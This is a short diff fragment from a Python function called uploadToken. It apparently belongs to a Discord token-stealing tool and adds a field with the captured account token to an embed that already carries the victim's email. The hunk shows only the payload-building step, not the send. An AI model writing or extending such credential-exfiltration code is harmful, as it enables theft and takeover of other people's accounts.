@@ -318,6 +318,10 @@ def uploadToken(token, path):
                 "color": 14406413,
                 "fields": [
                     {
+                    "name": ":rocket: Token:",
+                    "value": f"`{token}`\n"
+                    },
+                    {
                         "name": ":envelope: Email:",
                         "value": f"`{email}`",
                         "inline": True
